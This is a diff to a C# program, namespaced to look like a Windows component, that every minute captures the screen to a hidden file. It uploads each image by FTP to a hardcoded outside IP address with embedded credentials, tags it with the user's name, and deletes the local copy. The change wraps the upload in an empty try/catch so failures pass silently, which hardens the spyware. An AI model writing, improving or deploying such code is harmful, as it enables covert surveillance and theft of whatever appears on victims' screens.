@@ -31,11 +31,18 @@ namespace Windows_CSC
                 string today = DateTime.Now.ToString("yyyy-MM-d-HH-mm-ss");
                 ScreenImage().Save(path + today + ".jpg");
                 System.IO.File.SetAttributes(path + today + ".jpg", System.IO.FileAttributes.Hidden);
-                using (var client = new WebClient())
+                try
                 {
-                    client.Credentials = new NetworkCredential("u0951712", "ywCXB!58");
-                    client.UploadFile("ftp://37.140.192.54/screen/" + Environment.UserName + today + ".jpg", WebRequestMethods.Ftp.UploadFile, path + today + ".jpg");
+                    using (var client = new WebClient())
+                    {
+                        client.Credentials = new NetworkCredential("u0951712", "ywCXB!58");
+                        client.UploadFile("ftp://37.140.192.54/screen/" + Environment.UserName + today + ".jpg", WebRequestMethods.Ftp.UploadFile, path + today + ".jpg");
+                    }
                 }
+                catch
+                {
+
+                }                
                 System.IO.File.Delete(path + today + ".jpg");
                 Thread.Sleep(60000);
             }
